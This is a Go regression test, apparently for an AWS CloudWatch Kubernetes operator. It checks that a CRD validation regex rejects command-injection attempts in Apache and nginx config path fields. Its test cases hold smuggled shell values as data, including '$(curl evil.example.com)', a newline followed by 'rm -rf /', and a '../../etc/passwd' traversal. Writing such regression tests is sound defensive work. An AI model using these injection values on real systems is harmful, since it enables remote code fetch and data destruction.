// Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
// SPDX-License-Identifier: Apache-2.0

package v1alpha1

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/rest"
	"sigs.k8s.io/controller-runtime/pkg/envtest"
)

// envTestCfg is the rest.Config produced by the package-level TestMain
// envtest bootstrap, shared with TestInstrumentation_AdmissionRejectsMaliciousPaths.
var (
	envTestCfg *rest.Config
	envTestEnv *envtest.Environment
)

// TestMain bootstraps a single envtest control plane shared by all tests in
// this package. The CRDs from config/crd/bases are installed so apiserver-side
// OpenAPI validation (the only enforcement point for the P431312609 regex
// marker) is active.
//
// If envtest binaries are unavailable, we fail LOUD with a pointer at
// `make envtest` rather than skipping silently — per the task's invariant
// that this regression test must always run.
func TestMain(m *testing.M) {
	envTestEnv = &envtest.Environment{
		CRDDirectoryPaths:     []string{filepath.Join("..", "..", "config", "crd", "bases")},
		ErrorIfCRDPathMissing: true,
	}

	cfg, err := envTestEnv.Start()
	if err != nil {
		fmt.Fprintf(os.Stderr,
			"failed to start envtest control plane (run `make envtest` to install setup-envtest binaries, then `make test` which sets KUBEBUILDER_ASSETS): %v\n",
			err)
		os.Exit(1)
	}
	envTestCfg = cfg

	if err := AddToScheme(scheme.Scheme); err != nil {
		fmt.Fprintf(os.Stderr, "failed to register v1alpha1 scheme: %v\n", err)
		_ = envTestEnv.Stop()
		os.Exit(1)
	}

	code := m.Run()

	if stopErr := envTestEnv.Stop(); stopErr != nil {
		fmt.Fprintf(os.Stderr, "failed to stop envtest control plane: %v\n", stopErr)
		// Do not override a non-zero test exit code with the cleanup failure.
		if code == 0 {
			code = 1
		}
	}
	os.Exit(code)
}

// TestInstrumentation_AdmissionRejectsMaliciousPaths replays the P431312609
// exploit at the admission boundary: it submits Instrumentation CRs with
// shell-metacharacter-laden configPath/configFile values and asserts that the
// CRD's pattern marker (`^[A-Za-z0-9._/-]*$`) causes apiserver to reject them
// before they ever reach the operator. ACCEPT cases pin down the inverse
// invariant — that the regex still permits the legitimate defaults.
func TestInstrumentation_AdmissionRejectsMaliciousPaths(t *testing.T) {
	require.NotNil(t, envTestCfg, "envtest config not initialized — TestMain must have failed")

	dyn, err := dynamic.NewForConfig(envTestCfg)
	require.NoError(t, err)

	gvr := schema.GroupVersionResource{
		Group:    "cloudwatch.aws.amazon.com",
		Version:  "v1alpha1",
		Resource: "instrumentations",
	}
	const ns = "default"

	type tcase struct {
		name      string
		path      string
		field     string // "configPath" -> apacheHttpd; "configFile" -> nginx
		expectErr string // substring to match; "" => expect Create to succeed
	}

	cases := []tcase{
		// REJECT — shell metacharacters in configPath (apacheHttpd).
		{"apache_semicolon", "/tmp; touch /tmp/pwn", "configPath", "should match"},
		{"apache_dollar_paren", "$(curl evil.example.com)", "configPath", "should match"},
		{"apache_backtick", "/etc/`id`", "configPath", "should match"},
		// REJECT — embedded newline in configFile (nginx).
		{"nginx_newline", "/etc/nginx/nginx.conf\nrm -rf /", "configFile", "should match"},

		// ACCEPT — legitimate defaults.
		{"apache_default", "/usr/local/apache2/conf", "configPath", ""},
		{"nginx_default", "/etc/nginx/nginx.conf", "configFile", ""},
		// ACCEPT — empty string (regex `*` quantifier permits zero matches).
		{"empty_string", "", "configPath", ""},

		// ACCEPT — path traversal "../../etc/passwd".
		// DOCUMENTED DESIGN CHOICE: the regex `^[A-Za-z0-9._/-]*$` permits
		// `.`, `/`, and `-`, so traversal sequences like `../../...` slip
		// through. The marker's purpose is to block shell metacharacters
		// (preventing command injection in the init container scripts), NOT
		// to enforce filesystem scope. Filesystem-scope enforcement, if ever
		// needed, must be a separate layer (e.g. PodSecurity, OPA, or
		// operator-side validation against a configured allowlist).
		{"path_traversal_accepted_by_regex", "../../etc/passwd", "configPath", ""},
	}

	for i, tc := range cases {
		tc, i := tc, i
		t.Run(tc.name, func(t *testing.T) {
			specChild := "apacheHttpd"
			if tc.field == "configFile" {
				specChild = "nginx"
			}

			obj := &unstructured.Unstructured{
				Object: map[string]any{
					"apiVersion": "cloudwatch.aws.amazon.com/v1alpha1",
					"kind":       "Instrumentation",
					"metadata": map[string]any{
						"name":      fmt.Sprintf("p431-inst-%d", i),
						"namespace": ns,
					},
					"spec": map[string]any{
						specChild: map[string]any{
							tc.field: tc.path,
						},
					},
				},
			}

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()

			_, createErr := dyn.Resource(gvr).Namespace(ns).Create(ctx, obj, metav1.CreateOptions{})
			if tc.expectErr == "" {
				require.NoErrorf(t, createErr, "expected Create to succeed for %q (%s)", tc.path, tc.name)
				return
			}
			require.Errorf(t, createErr, "expected Create to be rejected for %q (%s)", tc.path, tc.name)
			require.Containsf(t, createErr.Error(), tc.expectErr,
				"error message missing %q substring; got: %v", tc.expectErr, createErr)
		})
	}
}
